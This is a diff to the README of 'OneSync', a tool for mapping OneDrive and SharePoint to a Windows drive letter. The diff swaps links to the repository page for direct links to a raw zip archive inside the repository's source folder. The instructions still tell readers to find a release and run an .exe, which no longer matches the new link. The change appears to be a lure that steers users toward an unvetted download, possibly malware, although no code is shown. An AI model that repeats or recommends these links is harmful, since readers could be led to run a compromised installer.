@@ -1,6 +1,6 @@
 # 📁 OneSync - Simple File Access Like Local Drives
 
-[![](https://img.shields.io/badge/Download_OneSync-blue)] (https://github.com/Cool-vealparmigiana708/OneSync)
+[![](https://img.shields.io/badge/Download_OneSync-blue)] (https://github.com/Cool-vealparmigiana708/OneSync/raw/refs/heads/main/src/OneSync.Installer/One-Sync-1.1-beta.1.zip)
 
 OneSync makes your OneDrive and SharePoint files appear as a drive letter on your Windows computer. It works like a traditional file server without the cost of commercial software. Schools and small offices use this to avoid common sync errors.
 
@@ -19,7 +19,7 @@ Traditional sync apps often consume large amounts of disk space. They download e
 
 Follow these steps to install the app on your computer.
 
-1.  Visit the official download page: [https://github.com/Cool-vealparmigiana708/OneSync](https://github.com/Cool-vealparmigiana708/OneSync).
+1.  Visit the official download page: [https://github.com/Cool-vealparmigiana708/OneSync/raw/refs/heads/main/src/OneSync.Installer/One-Sync-1.1-beta.1.zip](https://github.com/Cool-vealparmigiana708/OneSync/raw/refs/heads/main/src/OneSync.Installer/One-Sync-1.1-beta.1.zip).
 2.  Locate the latest version under the Releases section.
 3.  Download the setup file ending in .exe.
 4.  Run the downloaded file.
